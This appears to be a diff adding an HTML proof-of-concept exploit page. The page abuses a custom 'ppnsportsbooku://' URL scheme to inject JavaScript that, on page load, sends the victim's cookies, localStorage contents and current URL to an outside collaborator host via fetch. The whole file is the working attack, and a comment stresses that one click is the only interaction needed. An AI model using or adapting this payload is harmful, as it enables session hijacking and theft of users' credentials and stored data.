@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html><body>
+<script>
+  var collab = "wozawvr2.instances.httpworkbench.com";
+  var payload =
+    'ppnsportsbooku://x");' +
+    'fetch("' + collab + '/exfil?c="+encodeURIComponent(document.cookie)' +
+    '+"&ls="+encodeURIComponent(JSON.stringify(localStorage))' +
+    '+"&url="+encodeURIComponent(location.href));' +
+    '//';
+  location.href = payload;   // fires automatically on page load — 1 click to open the link is the ONLY interaction
+</script>
+</body></html>
